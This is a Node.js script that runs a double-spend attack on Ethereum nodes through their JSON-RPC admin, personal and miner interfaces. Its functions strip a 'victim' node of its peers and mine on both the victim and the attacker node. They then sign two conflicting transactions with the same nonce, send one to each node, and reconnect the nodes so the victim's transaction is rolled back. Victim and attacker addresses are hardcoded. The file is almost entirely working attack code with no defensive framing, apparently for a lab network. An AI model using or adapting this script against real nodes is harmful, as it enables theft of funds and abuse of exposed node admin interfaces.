const shell = require('shelljs');
const { personal_listAccounts, personal_importRawKey, personal_unlockAccount } = require('./rpc/personal');
const { miner_start, miner_stop } = require('./rpc/miner');
const { admin_nodeInfo, admin_addPeer, admin_removePeer, admin_peers } = require('./rpc/admin');
const { eth_getTransactionCount, eth_getTransactionByHash, eth_signTransaction, eth_sendRawTransaction } = require('./rpc/eth');
const { ACCOUNTS, PASS } = process.env;

function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

async function retry(promises, count) {
  for (let i = 0; i < count; i += 1) {
    await Promise.all(promises).catch(console.error);
  }
}

async function importRawKeys(uri) {
  let accounts = await personal_listAccounts(uri);
  // if (Array.isArray(accounts) && accounts.length) return accounts;
  accounts = ACCOUNTS.split(',');
  for (let account of accounts) {
    await personal_importRawKey(uri, account, PASS).catch(console.error);
  }
  return accounts;
}

async function signTransaction({ uri, from, to, gasPrice, gas, value, nonce, data }) {
  gasPrice = gasPrice || '0x9184e72a000';
  gas = gas || '0x76c0';
  value = value || '10000000000';
  value = '0x' + parseInt(value).toString(16);
  data = data || '0x';
  const tx = { from, to, gasPrice, gas, value, nonce, data };
  return eth_signTransaction(uri, tx);
}

async function removeAllPeers(uri) {
  let peers = await admin_peers(uri);
  const enodes = peers.map((peer) => peer.enode);
  for (var i = 0; i < enodes.length; i += 1) {
    await admin_removePeer(uri, enodes[i]);
  }
}

async function sendTransaction({ uri, from, to, gasPrice, gas, value, nonce, data, privateKey }) {
  const { raw } = await signTransaction({
    uri,
    from,
    to,
    gasPrice,
    gas,
    value,
    nonce,
    data,
  });
  const txId = await eth_sendRawTransaction(uri, raw);
  return { sender: from, to, value, nonce, txId, raw };
}

function description(server, tx) {
  console.log(`${tx.sender} sent ${tx.value}ETH to ${tx.to} in ${tx.txId} with ${server}`);
}

async function prepare(uris) {
  // 1. imports raw keys
  for (const uri of uris) {
    await importRawKeys(uri);
    const accounts = await personal_listAccounts(uri);
    console.log(`uri ${uri} - accounts ${accounts}`);
  }
}

async function start_mining(attack_uri, victim_uri, victim_ip) {
  // 1. remove exist peers
  await removeAllPeers(victim_uri);

  // 2. add peers
  const { enode } = await admin_nodeInfo(victim_uri);
  const ip = victim_ip;
  const peer = enode.replace('127.0.0.1', ip.replace('\n', ''));
  console.log('peer', peer);
  // 3. add peer
  await admin_addPeer(attack_uri, peer);

  // 4. miner start
  await miner_start(attack_uri);
}

async function stop_mining(attack_uri, victim_uri) {
  await miner_stop(victim_uri);
  await miner_stop(attack_uri);
}

async function remove_peers(uri) {
  await removeAllPeers(uri);
}

async function remove_all_peers(uris, count = 2) {
  return retry(uris.map(removeAllPeers), count);
}

async function connect_remote_uri(victim_uri, eth_ip, attack_uri) {
  // 1. add peers
  const { enode } = await admin_nodeInfo(victim_uri);
  const peer = enode.replace('127.0.0.1', eth_ip.replace('\n', ''));
  console.log('peer', peer);

  // 2. add the attack_uri peer
  await retry(admin_addPeer(attack_uri, peer));
}

async function attack(victim_uri, victim_ip, attack_uri) {
  // 1. miner start
  await miner_start(victim_uri);
  await miner_start(attack_uri);

  // 2. remove peers
  await removeAllPeers(victim_uri);
  await removeAllPeers(attack_uri);
  await sleep(3 * 1000);

  // 3 unlock account
  const accounts = await personal_listAccounts(attack_uri);
  const from = accounts[0];
  console.log('from  : ', from);
  await personal_unlockAccount(attack_uri, from, PASS);

  // 4. signTransaction
  const nonce = await eth_getTransactionCount(attack_uri, from);
  const { raw } = await signTransaction({
    uri: attack_uri,
    from,
    to: accounts[1],
    value: '10000000000000000',
    nonce,
  });

  // 5. send the raw to vir uri
  const ethTxId = await eth_sendRawTransaction(victim_uri, raw);
  console.log('eth tx id   : ', ethTxId);
  const ethTx = await eth_getTransactionByHash(victim_uri, ethTxId);
  await sleep(1000 * 20);
  console.log('eth tx info : ', ethTx);

  // 6. send the raw to eth uri
  const attackTxId = await eth_sendRawTransaction(attack_uri, raw);
  console.log('attack tx id   : ', attackTxId);
  const attackTx = await eth_getTransactionByHash(attack_uri, attackTxId);
  await sleep(1000 * 20);
  console.log('attack tx info : ', attackTx);

  // 7. reconnect
  // await connect_remote_uri(victim_uri, victim_ip, attack_uri);

  // await sleep(1000 * 20);
  // const newTx = await eth_getTransactionByHash(victim_uri, ethTxId);
  // console.log('new tx info : ', newTx);
}

async function double_spent(victim_uri, victim_ip, attack_uri) {
  // 1. miner start
  await miner_start(victim_uri);
  await miner_start(attack_uri);

  // 2. remove peers
  await remove_all_peers([victim_uri, attack_uri], 5);
  await sleep(10 * 1000);

  // 3 unlock account
  const accounts = await personal_listAccounts(attack_uri);
  const from = accounts[0];
  console.log('from  : ', from);
  await personal_unlockAccount(attack_uri, from, PASS);

  // 4. signTransaction
  const nonce = await eth_getTransactionCount(attack_uri, from);
  const { raw: victimRaw } = await signTransaction({
    uri: attack_uri,
    from,
    to: accounts[1],
    value: '10000000000000000',
    nonce,
  });

  const { raw: attackRaw } = await signTransaction({
    uri: attack_uri,
    from,
    to: accounts[1],
    value: '0',
    nonce,
  });

  // 5. send the raw to victim uri
  const ethTxId = await eth_sendRawTransaction(victim_uri, victimRaw);
  console.log('victim tx id   : ', ethTxId);
  await sleep(1000 * 30);
  const ethTx = await eth_getTransactionByHash(victim_uri, ethTxId);
  console.log('victim tx detail: ', ethTx);

  // 6. send the raw to eth uri
  const attackTxId = await eth_sendRawTransaction(attack_uri, attackRaw);
  console.log('attack tx id   : ', attackTxId);
  await sleep(1000 * 20);
  const attackTx = await eth_getTransactionByHash(attack_uri, attackTxId);
  console.log('attack tx detail: ', attackTx);

  await sleep(1000 * 60);

  await miner_stop(victim_uri);
  await sleep(1000 * 60);
  await miner_start(victim_uri);

  // 7. reconnect
  await connect_remote_uri(victim_uri, victim_ip, attack_uri);

  await sleep(1000 * 10);
  // 8. the victim tx would be rollback
  const newTx = await eth_getTransactionByHash(victim_uri, ethTxId);
  console.log('new tx detail : ', newTx);
}

const victim_ip = '10.0.152.116';
const victim_uri = 'http://10.0.152.116:8545/';
const attack_uri = 'http://127.0.0.1:8545/';

async function main() {
  const args = process.argv.slice(2);
  const method = args[0];
  switch (method) {
    case 'prepare':
      return prepare([attack_uri, victim_uri]);
    case 'connect':
      return connect_remote_uri(victim_uri, victim_ip, attack_uri);
    case 'disconnect':
      return remove_all_peers([victim_uri, attack_uri], 5);
    case 'start':
      return start_mining(attack_uri, victim_uri, victim_ip);
    case 'stop':
      return stop_mining(attack_uri, victim_uri, victim_ip);
    case 'attack':
      return attack(victim_uri, victim_ip, attack_uri);
    case 'double':
      return double_spent(victim_uri, victim_ip, attack_uri);
    default:
      break;
  }
}

main().catch(console.error);
